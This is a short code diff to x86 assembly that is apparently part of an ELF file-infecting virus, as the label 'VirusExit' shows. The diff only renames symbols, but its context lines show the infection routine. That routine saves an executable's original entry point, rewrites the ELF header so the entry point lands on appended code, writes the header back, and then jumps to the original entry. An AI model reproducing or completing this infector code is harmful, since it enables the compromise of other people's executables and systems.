@@ -177,7 +177,7 @@ _start:
     read [%$fd], [%$p_stack_var], ELF_HEADER_SIZE
 
     .save_original_entry_point:
-    mov eax, dword [%$elf_header+ENTRY]
+    mov eax, dword [%$elf_header+EHDR_entry]
     mov dword [%$exe_entry_point], eax
 
     .write_previous_entry_point:
@@ -228,7 +228,7 @@ _start:
     add eax, dword [%$exe_code_start_vaddr]
     add eax, dword [%$fsz]
     add eax, dword CODE_START_OFFSET
-    mov dword [%$elf_header+ENTRY], eax
+    mov dword [%$elf_header+EHDR_entry], eax
 
     .write_elf_header_back_to_file:
     seek_to_start [%$fd]
@@ -240,7 +240,7 @@ _start:
 
     .jump_to_previous_entry_point:
     get_lbl_loc PreviousEntryPoint
-    jmp [p_anchor]
+    jmp [anchor_loc_ret]
 
 VirusExit:
        exit 0 ; Termination if all is OK and no previous code to jump to
